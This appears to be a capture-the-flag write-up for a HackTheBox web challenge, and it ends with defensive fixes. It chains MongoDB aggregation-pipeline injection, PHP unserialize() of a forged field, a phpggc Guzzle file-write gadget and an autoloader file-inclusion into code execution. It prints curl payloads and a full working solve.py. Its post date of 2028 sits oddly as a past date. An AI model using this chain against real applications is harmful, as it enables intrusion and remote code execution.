---
layout: post
title: "UnEarthly Shop"
date: 2028-05-07 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, nosql-injection, mongodb, php-object-injection, deserialization, phpggc, autoload, rce]
description: "A shop that pipes your JSON straight into MongoDB's aggregate() lets you forge an admin user — and the field you forge is later unserialize()'d. A Guzzle gadget drops a PHP file, and a home-rolled autoloader that turns class names into file paths both loads the gadget library and executes the dropped shell. Autoload sorcery all the way down."
---

## Overview

UnEarthly Shop is a Hard HackTheBox **Web** challenge. It's a white-box PHP app split into a public frontend (which talks to MongoDB) and an admin backend (which reuses the same database). Four bugs chain into remote code execution as a SUID-root helper: a [NoSQL injection](https://cwe.mitre.org/data/definitions/943.html) that gives you a *write* primitive, [PHP object injection](https://cwe.mitre.org/data/definitions/502.html) on a field you control, a Guzzle file-write gadget, and — the star of the show — a custom autoloader that turns a class name into an arbitrary `require`.

## The technique

The frontend's product API hands your raw request body straight to MongoDB's `aggregate()`:

```php
// ShopController::products()
$query = json_decode(file_get_contents('php://input'), true);
$products = $this->product->getProducts($query);   // -> $collection->aggregate($query)
```

An aggregation pipeline is *code*, not a filter — so an unvalidated client-supplied pipeline is effectively "eval over the database", and that includes **writes** via `$merge`. The document you forge lands in the `users` collection, and its `access` field is later `unserialize()`d by the backend. Control that field and you control a PHP object graph.

## Solution

**Step 1 — Forge an admin user with a NoSQL aggregation-pipeline write.** `$set` rewrites the fields on a streamed product document; `$merge` writes the result into the `users` collection. `$limit: 1` avoids duplicate-`_id` errors from the six-document source.

```bash
curl -s -X POST "http://<target>/api/products" -H 'Content-Type: application/json' -d '[
  {"$limit": 1},
  {"$set": {"_id": 1337, "username": "pwn", "password": "pwn", "access": "<serialized gadget>"}},
  {"$merge": {"into": "users", "on": "_id", "whenMatched": "replace", "whenNotMatched": "insert"}}
]'
```

**Step 2 — Build the deserialization gadget.** The backend runs `unserialize($_SESSION['access'])` in `UserModel::__construct`, and that session value is copied from the Mongo field at login. So the `access` field is our injection point. Guzzle's `FileCookieJar::__destruct` writes attacker content to any path — `phpggc` builds it:

```bash
printf '%s' "<?php echo(system('/readflag')); ?>" > shell.php
phpggc Guzzle/FW1 /tmp/readflag.php shell.php
```

**Step 3 — Autoload sorcery.** Both `index.php` files register this autoloader:

```php
spl_autoload_register(function ($name) {
    if (preg_match('/_/', $name)) $name = preg_replace('/_/', '/', $name);
    $filename = "/${name}.php";
    if (file_exists($filename)) require $filename;   // class name -> arbitrary path
});
```

Because `unserialize()` instantiates every class it names, we choose which files get included. Guzzle only exists in the *frontend* vendor tree, so we prepend an object of class `www_frontend_vendor_autoload` — the autoloader `require`s `/www/frontend/vendor/autoload.php` mid-unserialize, loading the Guzzle classes so the following gadget resolves. The alias class need never exist; the `require` side-effect already ran and the unresolved class quietly becomes `__PHP_Incomplete_Class`.

The full `solve.py` (the durable artifact):

```python
import sys, requests, subprocess, re
BASE = sys.argv[1].rstrip('/')
PHPGGC = "/path/to/phpggc"

def fw1():
    open('/tmp/shell_content.php','w').write("<?php echo(system('/readflag')); ?>")
    return subprocess.check_output([f"{PHPGGC}/phpggc","Guzzle/FW1","/tmp/readflag.php",
                                    "/tmp/shell_content.php"],cwd=PHPGGC).decode().strip()

stage1 = f'a:2:{{i:0;O:28:"www_frontend_vendor_autoload":0:{{}}i:1;{fw1()}}}'
stage2 = 'O:12:"tmp_readflag":0:{}'

def forge(access):
    requests.post(f"{BASE}/api/products", json=[
        {"$limit":1},
        {"$set":{"_id":1337,"username":"pwn","password":"pwn","access":access}},
        {"$merge":{"into":"users","on":"_id","whenMatched":"replace","whenNotMatched":"insert"}}])

def login_trigger():
    s = requests.Session()
    s.post(f"{BASE}/admin/api/auth/login", data={"username":"pwn","password":"pwn"})
    return s.get(f"{BASE}/admin/dashboard").text   # UserModel ctor unserializes here

forge(stage1); login_trigger()                     # stage 1: writes /tmp/readflag.php
forge(stage2); body = login_trigger()              # stage 2: includes + runs it
print(re.search(r'HTB\{[^}]+\}', body).group(0))
```

Two requests are required: `FileCookieJar` writes the file at request **shutdown** (its destructor), so `/tmp/readflag.php` must exist on disk before the second request's `O:12:"tmp_readflag":0:{}` class-load `require`s it. That include runs `system('/readflag')` and its output is emitted inline into the response — the flag comes back as `HTB{...}`.

## Why it worked

Three trust boundaries were crossed in one chain. A client-supplied aggregation pipeline is arbitrary database logic, so the "read products" endpoint became an arbitrary *write*. The app then trusted a value it had just let the attacker write and fed it to `unserialize()`. And a home-rolled autoloader that derives an include path from a class name is a [file-inclusion sink](https://cwe.mitre.org/data/definitions/98.html) — it loaded the very gadget library the backend was missing, then executed the file the gadget dropped.

## Fix / defense

- Build aggregation pipelines server-side from typed scalars; validate the request body against a schema. An aggregation pipeline is never user data.
- Never `unserialize()` untrusted input — `unserialize($d, ['allowed_classes' => false])`, or use JSON.
- Replace the class-name-to-path autoloader with a fixed classmap (Composer's generated autoloader); never `require` a path derived from a class name.
- Apply least privilege so the web user cannot invoke a root-reading helper like `/readflag`.
